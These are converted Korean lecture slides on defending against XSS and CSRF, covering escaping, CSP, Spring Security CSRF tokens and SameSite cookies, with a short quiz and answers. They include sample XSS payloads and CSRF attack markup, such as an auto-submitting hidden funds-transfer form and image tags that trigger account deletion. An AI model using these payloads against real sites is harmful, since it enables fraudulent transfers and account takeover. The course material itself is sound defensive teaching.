동적 콘텐츠 출력 시, 특히 사용자 입력을 직접 HTML에 삽입하는 경우

---

## [2-SLIDES] 7주차 2차시 p.24 · HTML 엔티티 이스케이프 처리
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**취약한 코드 (이스케이프 미적용)**
사용자 입력을 그대로 HTML에 삽입하여 XSS 공격에 노출

**예시**

```javascript
// 사용자 입력을 가져와서 그대로 innerHTML에 할당 (취약)
var userInput = getUserInput();
document.getElementById("content").innerHTML = userInput;
```

**공격 시나리오**
사용자가 <script>alert('XSS');</script>와 같은 입력을 전달하면,
해당 스크립트가 실행되어 공격자가 쿠키 탈취, 세션 하이재킹 등 다양한 공격을 수행할 수 있음

(※ 검증: HTML5 명세상 innerHTML로 삽입된 `<script>` 요소는 실행되지 않음. 따라서 이 시나리오의 `<script>alert('XSS');</script>` 입력 자체는 실행되지 않으며, 실제 공격은 `<img src=x onerror=alert('XSS')>`처럼 이벤트 핸들러를 이용한 입력으로 이루어짐 — innerHTML이 XSS에 취약하다는 결론은 맞음)

---

## [2-SLIDES] 7주차 2차시 p.25 · HTML 엔티티 이스케이프 처리
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**안전한 코드 구현**
- 방법 1: 사용자 입력 이스케이프 함수 적용
  - 사용자 입력을 HTML 엔티티로 변환하는 함수를 사용하여 안전하게 출력
- 방법 2: textContent 속성 사용
  - DOM에 텍스트만 삽입하여 브라우저가 HTML로 해석하지 않도록 함

**효과**
이스케이프 처리를 통해 악의적인 스크립트가 실행되지 않으며, 안전한 텍스트로 표시됨

```javascript
function escapeHtml(text) {
    return text.replace(/&/g, "&amp;")
               .replace(/</g, "&lt;")
               .replace(/>/g, "&gt;")
               .replace(/"/g, "&quot;")
               .replace(/'/g, "&#039;");
}

var userInput = getUserInput(); // 예: "<script>alert('XSS');</script>"
var safeInput = escapeHtml(userInput);
document.getElementById("content").innerHTML = safeInput;
```
< 방법 1: 사용자 입력 이스케이프 함수 적용 >

```javascript
var userInput = getUserInput(); // 사용자 입력
document.getElementById("content").textContent = userInput;
```
< 방법 2: textContent 속성 사용 >

(※ 검증: Python으로 같은 치환 순서를 재현 — 입력 `<script>alert('XSS');</script>` → `&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;`, 다시 unescape하면 원문과 동일하므로 화면에는 글자 그대로 표시되고 실행되지 않음 — 일치. `&`를 가장 먼저 치환해야 이후에 만든 `&lt;` 등이 `&amp;lt;`로 이중 변환되지 않음 — 원문 순서가 올바름)

---

## [2-SLIDES] 7주차 2차시 p.26 · Spring Web MVC에서 입출력 필터링
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

• Spring Web MVC 프레임워크를 사용하는 경우 입력 값 필터링 정책 적용

[도식] Spring MVC 요청 처리 흐름과 필터링 지점

```text
Client --User Request  Filter    DispatcherServlet  <  HandlerMapping
Client <--User Response-- Filter  <--  DispatcherServlet
                                       DispatcherServlet  <  Handler Interceptor  <  Handler(Controller)
                                                                                           ├ Data binding
                                                                                           ├ Validation
                                                                                           │   ↓
                                                                                           └ Business Logic
                                                                                           HandlerExceptionResolver
                                       DispatcherServlet     View Resolver
                                       DispatcherServlet     View
```

필터링 수행 위치(파란 테두리 말풍선):
- 입력 값에 대해 필터링 수행 → **Filter**
- 입력 값에 대해 Interceptor에서 필터링 수행 → **Handler Interceptor**
- 입력 값에 대해 Controller Validator 에서 필터링 수행 → Handler(Controller) 안의 **Validation**
- 출력 값에 대해 Controller 에서 필터링 수행 → **Handler(Controller)** (Business Logic 결과)
- 출력 값에 대해 View 에서 필터링 수행 → **View**

→ 요청은 Client → Filter → DispatcherServlet → HandlerMapping으로 처리할 핸들러를 찾고 → Handler Interceptor → Controller(Data binding → Validation → Business Logic)를 거치며, 응답은 역방향으로 Interceptor → DispatcherServlet → View Resolver/View → Filter → Client로 반환됨. 예외는 HandlerExceptionResolver가 처리.

---

## [2-SLIDES] 7주차 2차시 p.27 · CSP(Content-Security-Policy) 적용
CSP(Content-Security-Policy) 적용
HTTP 응답 헤더 CSP를 통해 설정함
XSS 공격 방어 효과
- 인라인 스크립트 차단
기본적으로 'unsafe-inline' 없이 스크립트 실행을 제한하여, 악의적으로 삽입된 인라인 코드가 실행되지 않도록 함
- 신뢰하는 스크립트만 허용
신뢰할 수 있는 도메인에서 제공하는 스크립트만 로드하게 하여, 외부 공격자의 스크립트 주입 차단
- 동적 코드 실행 방지
eval()이나 new Function() 같은 동적 코드 실행을 제한할 수 있음
XSS 방어와 CSP의 연계
CSP는 XSS 취약점이 존재하더라도, 악의적 스크립트 실행을 실질적으로 차단하여 추가적인 방어층을 제공

---

## [2-SLIDES] 7주차 2차시 p.28 · CSP(Content-Security-Policy) 적용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

• 예시: 웹 서버별 CSP 헤더 설정

• Apache 예시: httpd.conf 또는 .htaccess 내에 설정

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';"
```

• Nginx 예시: nginx.conf 또는 해당 서버 블록 내에 설정

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';";
```

(※ 검증: Python으로 정책 문자열을 `;` 기준으로 파싱 — `default-src 'self'`, `script-src 'self' https://trusted.cdn.com`, `object-src 'none'` 3개 지시어와 끝의 빈 항목(마지막 `;`, 허용됨). Apache는 `Header set 이름 "값"`(mod_headers 필요), Nginx는 `add_header 이름 "값";`으로 지시어 끝에 `;`가 붙는 형식 — 두 설정 모두 문법 일치. `'unsafe-inline'`이 없으므로 인라인 스크립트가 차단됨)

---

## [2-SLIDES] 7주차 2차시 p.29 · 요약 정리
요약 정리
- XSS는 검증되지 않은 입력 값으로 인해, 브라우저에서 악성 스크립트가 실행되는 취약점이다.
- Reflected, Stored, DOM 기반 XSS로 분류되며, 세션 탈취나 브라우저 조작이 가능하다.
- 특히, 게시판이나 댓글 등에 악성 코드가 삽입된 Stored XSS는 다수 사용자에게 피해를 줄 수 있다.
- 입출력 값 검증, HTML 이스케이프, CSP를 적용해 XSS를 효과적으로 막을 수 있다.
- 다단계 방어와 자동화 테스트로 재발을 방지해야 한다.

---

## [2-SLIDES] 7주차 2차시 p.30 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 7주차 2차시 p.31 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 7주차 2차시 p.32 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. 다음 중 XSS 방어 기법에 해당하지 않는 것은 ?
   1) HTML 엔티티 이스케이프로 <script>를 무해한 텍스트로 변환
   2) CSP를 적용해 악성 스크립트 로드를 제한
   3) 입력값 필터링으로 < > 같은 특수문자 차단
   4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증

2. 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ?
   1) `out.println("You searched for: " + request.getParameter("q"));`
   2) `response.setHeader("Content-Security-Policy", "default-src 'self'");`
   3) `<input type="hidden" name="_csrf" value="...">`
   4) `textContent = escapeHtml(userInput);`

3. XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은?
   (영어 대문자 3글자)
   (            )

---

## [2-SLIDES] 7주차 2차시 p.33 · 퀴즈 정답
퀴즈 정답
1. 다음 중 XSS 방어 기법에 해당하지 않는 것은 ?
4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증
CSRF 토큰은 주로 CSRF 공격 방어 기법이며, XSS 방어와는 직접 관련이 없습니다.
2. 다음 중 XSS를 유발할 수 있는 취약한 코드 예시로 옳은 것은 ?
1) out.println("You searched for: " + request.getParameter("q"));
사용자 입력값을 검증 없이 그대로 출력하면 XSS 공격이 발생할 수 있습니다.
3. XSS의 종류 중 서버를 거치지 않고, 클라이언트 자바스크립트 로직에서 발생하는 공격 방식은?
(영어 대문자 3글자)
( DOM )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(정답 표시: 1번의 "4) CSRF 토큰을 사용해 사용자 요청이 정당한지 검증", 2번의 "1) out.println(...)" 코드, 3번의 "DOM"이 빨간 글씨로 강조됨)

# [2-SLIDES] 7주차 3차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Stored XSS/저장형 XSS/스토어드 · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · SameSite/세임사이트/Strict/Lax/None · 화이트리스트/Whitelist/최소 허용/허용 목록 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

## [2-SLIDES] 7주차 3차시 p.1 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.2 · 학습 목표
학습 목표
CSRF(크로스 사이트 요청 위조)의 개념과 공격 원리를 이해한다.
실제 CSRF 공격 기법을 학습하고, 취약점을 진단하는 방법을 익힌다.
CSRF 방어 기법을 적용하여 웹 애플리케이션 보안을 강화할 수 있다.

---

## [2-SLIDES] 7주차 3차시 p.3 · 학습 내용
학습 내용
1. CSRF 취약점 이해
2. CSRF 취약점 진단
3. CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.4 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.5 · CSRF(크로스 사이트 요청 위조)란?
CSRF(크로스 사이트 요청 위조)란?
정의
Cross-Site Request Forgery의 약자로, 사용자의 인증 정보를 이용해 의도치 않은 요청을 강제 실행하는 공격
→ 공격자가 악의적인 웹 페이지, 이메일, 또는 다른 매체를 통해 사용자의 브라우저에 요청을 보내도록 유도
취약점 배경
웹 애플리케이션이 인증 상태(쿠키 등)를 기반으로 요청을 처리하는 구조
브라우저는 같은 도메인에 대한 요청 시 자동으로 쿠키를 전송하므로, 사용자가 의도치 않은 요청에도 인증 정보를 포함하게 됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[그림: CSRF 공격 개념도 (왼쪽 → 오른쪽 흐름)]**

- 왼쪽: 후드를 쓴 가면(가이 포크스 가면) 해커가 노트북 앞에 있음 (공격자).
- → 주황색 라벨 **"CSRF"**가 붙은 화살표 → 가운데: 책상에서 노트북을 쓰는 정장 차림 사용자(로그인한 피해자).
- → 라벨 **"Cookies"**가 붙은 화살표 → 한 입 베어 문 쿠키 그림 → 화살표 → 오른쪽: 서버 본체 + 모니터. 모니터 속 브라우저 창 주소창에 `http://`, 창 안에 **"CSRF"** 글자.
- 의미: 공격자가 CSRF 요청을 사용자에게 심으면, 사용자의 브라우저가 쿠키(인증 정보)를 자동으로 붙여 서버에 요청을 보내게 됨.

---

## [2-SLIDES] 7주차 3차시 p.6 · CSRF 취약점 발생 원인
CSRF 취약점 발생 원인
인증 정보 자동 전송
브라우저는 사용자가 로그인한 사이트의 쿠키를 모든 요청에 자동으로 첨부함
→ 공격자가 악의적인 페이지에서 동일 도메인의 요청을 보내면, 사용자 인증 정보가 함께 전송되어 정상 요청으로 인식됨
요청 검증 부재
서버 측에서 요청의 출처(origin)나 referer를 검증하지 않거나, CSRF 토큰과 같은 추가 검증 절차 미적용
GET 요청 등 상태 변경에 사용되는 요청이 별도의 확인 없이 처리되는 경우
취약한 쿠키 설정
쿠키에 SameSite 속성이 적용되지 않으면, 타 도메인에서의 요청에도 쿠키가 전송될 수 있음

---

## [2-SLIDES] 7주차 3차시 p.7 · CSRF 취약점 공격 흐름
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

사이트가 신뢰하는 사용자(인증된 사용자)의 세션을 통해, 공격자가 원하는 명령(공격자에게는 인가되지 않은)을 대신 실행하도록 한다.

페이지에 숨겨놓은 악의적인 공격(form문과 자바스크립트를 이용)으로 원하지 않는 악의적인 액션을 서버로 요청한다.

예를 들면, 숨겨둔 공격코드를 적은 게시판 글을 관리자가 누르면 관리자의 권한으로 form문을 실행시켜 어떤 액션을 수행하는 것이다.

**[도식: CSRF 공격 흐름 — 공격자(왼쪽 아래) / 웹 서버(가운데 위) / 사용자(오른쪽 아래)]**

| 단계 | 방향 | 화살표 라벨 |
|---|---|---|
| ① | 공격자 → 웹 서버 (공격자에서 위로 올라가 오른쪽 웹 서버로) | ① 크로스사이트 요청 위조 (CSRF) 공격 코드 등록 |
| ② | 사용자 → 웹 서버 (사용자에서 위로 올라가 왼쪽 웹 서버로) | ② CSRF Script가 포함된 페이지 요청 |
| ③ | 웹 서버 → 사용자 (웹 서버 아래로 내려가 오른쪽 사용자로) | ③ Response |
| ④ | 사용자 → 웹 서버 (사용자 PC에서 대각선으로 웹 서버로, 그라데이션 선) | ④ CSRF에 의해 사용자의 권한으로 서비스 요청 |

- 공격자 아이콘: 선글라스 낀 사람 + 노트북, 라벨 "공격자". 웹 서버 아이콘: 서버 랙, 라벨 "웹 서버". 사용자 아이콘: 데스크톱 PC + 사람, 라벨 "사용자".
- 공격자에게서 나오는 생각 풍선(점선 구름) 안의 글:
  > URL이나 파라미터 조작을 통해 직접적으로 서버에 요청을 전송하여 처리상태를 확인한다.

  (즉, 공격자는 먼저 자신이 직접 URL/파라미터를 조작해 요청을 보내 보며 어떤 요청이 어떤 처리를 일으키는지 확인한 뒤, 그 요청을 공격 코드로 만들어 게시판 등에 등록함)

---

## [2-SLIDES] 7주차 3차시 p.8 · CSRF 취약점 공격 흐름
CSRF 취약점 공격 흐름
1. 사용자가 중요한 웹 서비스(예:은행, 증권)로 로그인
세션 쿠키가 사용자 웹 브라우저에 저장됨
2. 악성 링크 클릭
이메일 또는 게시판에 게시된 가짜 사이트 주소를 클릭
- 이미지 로드시 동작
<img src="https://bank.com/transfer?to=hacker&amount=1000000">
- 숨겨진 iframe 로드시 무단 '좋아요' 클릭 동작
<iframe src="http://sns.com/like?postId=434">
3. 공격자 사이트가 사용자의 웹 브라우저를 통해 로그인 되어 있던 중요한 웹 서비스에 요청 전송
- 자동으로 저장되어 있던 세션 쿠키를 해당 사이트로 전송
4. 중요한 웹 사이트는 정상 사용자의 요청이라고 인식하므로 민감한 동작(예:계좌이체) 수행

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python `urllib.parse`로 두 URL을 분해 — `https://bank.com/transfer` 경로에 쿼리 `to=hacker`, `amount=1000000`(100만), `http://sns.com/like` 경로에 `postId=434`. `<img>`·`<iframe>`의 `src`는 페이지 로드 시 브라우저가 자동으로 GET 요청을 보내므로, 클릭 없이도 이 상태 변경 요청이 쿠키와 함께 전송됨 — 슬라이드 설명과 일치)

---

## [2-SLIDES] 7주차 3차시 p.9 · CSRF와 XSS의 차이점
CSRF와 XSS의 차이점
XSS(크로스 사이트 스크립팅)
공격자가 웹 사이트에 악성 스크립트를 삽입, 사용자의 웹 브라우저에서 실행
주로 브라우저 내 스크립트 조작 및 쿠키 탈취, UI 변조에 활용
CSRF(크로스 사이트 요청 위조)
공격자가 사용자 대신 다른 웹 사이트에 요청을 보내도록 유도
서버 입장에서 사용자 의도와 무관한 요청을 정상 요청으로 오인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[그림: XSS vs CSRF 비교 일러스트 (오른쪽 아래)]**

- 하늘색 배경에 검은 캐릭터 두 명.
- 왼쪽 캐릭터: 몸에 **"XSS"**, 손에 **`<script>`** 팻말을 들고 브라우저 창(점 3개 탭, 입력창) 앞에 서 있음 → 웹 페이지에 스크립트를 삽입하는 공격.
- 오른쪽 캐릭터: 몸에 **"CSRF"**, 뒤에는 **Login** 버튼이 있는 로그인 화면 모니터. XSS 캐릭터가 오른쪽 캐릭터 쪽으로 **"FAKE FORM"** 종이를 내밀고 있음 → 위조된 폼(요청)으로 로그인된 사용자의 권한을 악용하는 공격.

---

## [2-SLIDES] 7주차 3차시 p.10 · CSRF 공격 사고 사례
CSRF 공격 사고 사례

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처: 보안뉴스 기사 — 슬라이드 본문은 제목뿐이고 내용 전체가 이미지]**

- 사이트: 보안뉴스(왼쪽 위 '시큐리티월드' 로고), 경로 Home > 전체기사
- 기사 제목: **워드프레스의 플러그인에서 위험한 CSRF 취약점 발견돼**
- 입력: 2020-04-29 17:12, 보안뉴스 문가용 기자

(※ 기사 본문은 저작권상 원문 대신 요지만 옮김 — 빨간 박스로 강조된 부분 포함)

**[빨간 박스 1 — 부제목 요지]** '실시간 찾기 및 바꾸기(Real-Time Find and Replace)' 플러그인(HTML 콘텐츠를 쉽게 교체해 주는 기능)에 CSRF 취약점이 있어 공격자도 HTML 콘텐츠를 바꿀 수 있으며, 4.0.2 버전으로 업데이트가 필요하다는 내용. (※ 원문 부제목에 '통해'가 '토해'로 오타)

**[본문 요지]**
- 이 플러그인은 워드프레스 관리자가 테마·플러그인 등의 HTML 콘텐츠를 원하는 대로 교체하게 해 주는 오픈소스 플러그인으로, 약 10만 회 다운로드됨. (※ 원문에 '워드프레스'가 '워드프레서'로 오타)
- **[빨간 박스 2 요지]** 발견된 취약점은 CSRF로 분류되며 XSS 공격으로 이어짐 — 익스플로잇에 성공하면 공격자가 악성 자바스크립트를 사이트에 주입할 수 있음. 단, 사이트 관리자가 특정 링크를 클릭하거나 파일을 내려받게 하는 '속임수'가 먼저 성공해야 함.
- 취약점을 발견한 워드프레스 보안 업체 데피안트(Defiant)에 따르면, 핵심 기능인 '찾기 및 교체 규칙 추가하기'가 `far_options_page` 함수 안에 있는데 이 함수가 **요청의 출처를 제대로 확인하지 않는 것**이 CSRF 취약점의 정체.

- 강의 맥락 요점: 관리자 권한으로 실행되는 설정 변경 기능(`far_options_page`)이 요청 출처(CSRF 토큰/nonce 등)를 검증하지 않아, 관리자가 공격자 링크를 클릭하면 공격자가 원하는 '찾기·교체 규칙'(악성 JS 삽입)이 관리자 권한으로 등록됨 → CSRF가 저장형 XSS로 이어진 사례. 패치 버전 4.0.2.

---

## [2-SLIDES] 7주차 3차시 p.11 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.12 · CSRF 공격 기법
CSRF 공격 기법
CSRF 공격의 기본 원리
공격자가 악의적인 웹 페이지나 이메일 등을 통해 피해자의 브라우저로 타깃 사이트에 의도치 않은 요청을 보내도록 유도
→ 피해자의 인증 쿠키가 자동으로 포함되어, 서버는 정상 요청으로 처리
주요 공격 기법
- GET 요청 기반 공격
이미지 태그, 링크, 스크립트를 이용해 GET 요청을 강제 실행
(예) <img src="https://target.com/deleteAccount?user=123" />
- POST 요청 기반 공격
숨겨진 폼과 자바스크립트를 이용해 POST 요청을 자동 제출
(예) HTML 폼을 auto-submit 처리하여 중요한 작업(예: 자금 이체)을 실행

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python으로 URL 분해 — `https://target.com/deleteAccount` 경로, 쿼리 `user=123`. `<img>` 태그는 렌더링 시 src로 GET 요청을 자동 전송하므로 계정 삭제 같은 상태 변경을 GET으로 처리하는 서버라면 쿠키와 함께 실행됨 — 일치)

---

## [2-SLIDES] 7주차 3차시 p.13 · CSRF 공격 기법
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.13 · 예시 1: GET 요청을 이용한 CSRF

공격자 페이지 코드

```html
 공격자가 피해자에게 보낼 악의적 링크 예시 
<img src="https://target.com/action?param=value" alt="image" />
```

피해자가 해당 페이지를 로드하면, 브라우저가 자동으로 GET 요청을 보내고, 서버는 피해자의 쿠키와 함께 요청을 처리

### [2-SLIDES] 7주차 3차시 p.13 · 예시 2: POST 요청을 이용한 CSRF (숨겨진 폼 & 자동 제출)

공격자 페이지 코드

```html
<form id="csrfForm" action="https://target.com/transferFunds" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="toAccount" value="attackerAccount">
</form>
<script>
  // 페이지 로드 시 폼 자동 제출
  document.getElementById("csrfForm").submit();
</script>
```

피해자가 페이지를 방문하면 폼이 자동으로 제출되어, 피해자의 인증 쿠키를 포함한 POST 요청이 실행

(※ 검증: Python `html.parser`로 예시 2 폼을 파싱 — `POST https://target.com/transferFunds`, 전송 본문(application/x-www-form-urlencoded)은 `amount=1000&toAccount=attackerAccount`, `getElementById("csrfForm")`의 id가 폼 id와 일치 — 일치. 예시 1의 URL은 `/action` 경로 + `param=value` 쿼리)

---

## [2-SLIDES] 7주차 3차시 p.14 · CSRF 공격 기법
CSRF 공격 기법
예시 3: 링크 클릭을 유도하는 사회공학적 CSRF
공격자가 피해자에게 URL을 포함한 메시지(예: 이메일, SNS)를 보내어 클릭을 유도
(예) https://target.com/updateEmail?newEmail=attacker@example.com
피해자가 링크를 클릭하면, 피해자의 인증 정보와 함께 요청이 실행되어 이메일 변경 등의 작업이 이루어짐

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python `urllib.parse`로 분해 — 경로 `/updateEmail`, 쿼리 `newEmail=attacker@example.com` 한 개. 쿼리 안의 `@`는 인코딩(`%40`) 없이도 정상 파싱됨 — 일치. 이메일이 공격자 주소로 바뀌면 '비밀번호 찾기'로 계정 탈취까지 이어질 수 있는 대표 시나리오)

---

## [2-SLIDES] 7주차 3차시 p.15 · CSRF 공격이 가능한 취약한 웹 사이트
CSRF 공격이 가능한 취약한 웹 사이트
상태 기반 인증 사용
사용자 로그인 후, 세션 쿠키를 통해 인증 상태 유지
(브라우저는 모든 요청에 대해 자동으로 쿠키를 전송)
부적절한 요청 검증
CSRF 토큰 미사용 또는 검증 로직 부재
Origin 또는 Referer 헤더 검증이 없는 경우
GET/POST 불분명한 구분
상태 변경 작업(예: 계정 삭제, 이메일 변경, 자금 이체 등)이 GET 요청으로도 수행됨
POST 요청의 경우에도 별도의 CSRF 보호 없이 처리

---

## [2-SLIDES] 7주차 3차시 p.16 · CSRF 공격이 가능한 취약한 웹 사이트
CSRF 공격이 가능한 취약한 웹 사이트
입력 데이터 검증 미흡
사용자 입력(폼 데이터, URL 파라미터 등)을 검증 없이 처리
공격자가 임의의 값을 주입할 수 있음
자동화된 요청 검증 미흡
자동 제출 폼 또는 URL 링크를 통한 요청 전송
- GET 방식: <img src="https://vulnerable.com/deleteAccount?userId=123" />
- POST 방식: 숨겨진 폼이 별도의 CSRF 보호 없이 자동 제출됨
민감 작업에 대한 보호 미흡
중요 작업(계좌 이체, 비밀번호 변경 등)을 위한 추가 확인 절차 부재
사용자 의도와 관계없이 요청이 실행될 수 있음

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 검증: Python으로 URL 분해 — `https://vulnerable.com/deleteAccount`, 쿼리 `userId=123` — 일치. 12쪽 예시는 파라미터명이 `user=123`, 이 쪽은 `userId=123`으로 서로 다른 가상 예시임)

---

## [2-SLIDES] 7주차 3차시 p.17 · CSRF 취약점 진단 및 대응
CSRF 취약점 진단 및 대응
01 CSRF 취약점 이해
02 CSRF 취약점 진단
03 CSRF 취약점 방어

---

## [2-SLIDES] 7주차 3차시 p.18 · CSRF 토큰 적용 및 활용
CSRF 토큰 적용 및 활용
Spring Security의 CSRF 보호
기본적으로 CSRF 보호 기능이 활성화되어 있으며, HttpSession에 CSRF 토큰을 저장
웹 폼에 자동으로 CSRF 토큰이 포함되어, 폼 제출 시 서버에서 토큰을 검증
토큰 검증 실패 시 요청이 차단되어, CSRF 공격을 방지
CSRF 보호 동작 방식
- 서버에서 토큰 생성: 사용자 세션 생성 시, CSRF 토큰이 함께 생성됨
- 클라이언트에서 토큰 포함: 폼, AJAX 요청 등 모든 상태 변경 요청에 CSRF 토큰이 숨겨진 필드나 HTTP 헤더로 포함됨
- 서버에서 토큰 검증: 요청에 포함된 토큰과 세션에 저장된 토큰을 비교하여 유효성을 확인
유의 사항
REST API와 같이 상태 비저장(stateless) 환경에서는 별도의 토큰 처리 전략 필요

---

## [2-SLIDES] 7주차 3차시 p.19 · CSRF 토큰 적용 및 활용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.19 · Spring Security Java Configuration 예시

```java
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf() // CSRF 보호 활성화 (기본값)
            .and()
            .authorizeRequests()
                .antMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            .and()
            .formLogin()
                .loginPage("/login")
                .permitAll();
    }
}
```

- 캡처에서 `.csrf()` 바로 옆에 **빨간 별표(☆)**가 그려져 강조됨 — CSRF 보호가 켜지는 지점.

### [2-SLIDES] 7주차 3차시 p.19 · HTML FORM에 CSRF 토큰 적용 (Thymeleaf 예시)

Thymeleaf 환경에선 자동으로 히든 필드로 추가됨

```html
<form th:action="@{/update}" method="post">
    <input type="text" name="data" />
     Spring Security가 자동으로 CSRF 토큰 숨은 필드로 삽입 
    <button type="submit">제출</button>
</form>
```

### [2-SLIDES] 7주차 3차시 p.19 · AJAX 요청에서 CSRF 토큰 사용

1) HTML 생성시 meta 태그에서 토큰 이름과 값을 넣어 보냄
2) 스크립트에서 meta 태그의 토큰 이름/내용을 가져와 포함시켜 전송

```html
 CSRF 토큰 메타 태그 
<meta name="_csrf"        content="${_csrf.token}" />
<meta name="_csrf_header" content="${_csrf.headerName}" />

<script>
  // 메타 태그에서 토큰·헤더명 추출
  const token  = document.querySelector('meta[name="_csrf"]').content;
  const header = document.querySelector('meta[name="_csrf_header"]').content;

  // AJAX 요청 (fetch)
  fetch('/api/data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      [header]: token
    },
    body: JSON.stringify({ hello: 'world' })
  });
</script>
```

(※ 검증: 세 코드의 괄호·중괄호 짝을 Python으로 확인 — 모두 균형, 일치. `[header]: token`은 JS 계산된 속성명이라 헤더 이름이 meta 값(Spring 기본값 `X-CSRF-TOKEN`)으로 들어감. 참고: ① `WebSecurityConfigurerAdapter`는 Spring Security 5.7에서 deprecated, 6.0에서 제거되었고 `antMatchers`도 6.0에서 `requestMatchers`로 대체됨 — 이 Java 예시는 Spring Boot 2.x / Security 5.x 기준 문법. Security 6.x에서는 `SecurityFilterChain` 빈과 `http.csrf(Customizer.withDefaults())` 형태로 작성. ② meta 태그의 `content="${_csrf.token}"`는 JSP(EL) 문법이며, Thymeleaf에서는 `th:content="${_csrf.token}"`처럼 `th:` 속성을 써야 값이 치환됨. ③ Thymeleaf는 `th:action` + `method="post"` 폼에 `_csrf` hidden 필드를 자동 삽입 — 슬라이드 설명과 일치)

---

## [2-SLIDES] 7주차 3차시 p.20 · SameSite Cookie 정책 설정
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 7주차 3차시 p.20 · SameSite Cookie란?
- 브라우저에서 웹 요청 시 어떤 조건 하에 쿠키가 함께 전송될지 제어하는 속성
- CSRF 공격 등 외부 사이트에서의 악의적 요청으로부터 보호

### [2-SLIDES] 7주차 3차시 p.20 · 주요 속성 값
- **Strict**
  - 쿠키가 오직 동일 사이트 내 요청에만 전송됨
- **Lax**
  - 최초 타 사이트 접속하는 경우만 전송하고 그 외 크로스사이트 요청들엔 차단
- **None**
  - 모든 요청에서 쿠키 전송
  - 반드시 Secure 플래그와 함께 사용해야 함

### [2-SLIDES] 7주차 3차시 p.20 · CSRF 대응 효과
